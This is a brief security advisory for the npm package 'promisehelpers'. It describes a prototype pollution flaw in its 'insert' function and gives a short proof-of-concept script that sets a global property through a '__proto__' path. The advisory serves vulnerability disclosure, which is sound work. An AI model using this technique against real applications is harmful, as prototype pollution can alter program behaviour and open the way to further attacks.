# Overview
`promisehelpers` is a Promise helper functions, this package is vulnerable to Prototype Pollution via. the `insert` function.

# Proof of Concept
```
const promisehelpers = require('promisehelpers');
var obj = {};
promisehelpers.insert(['__proto__', 'polluted'], true)(obj);
console.log(polluted); // true
```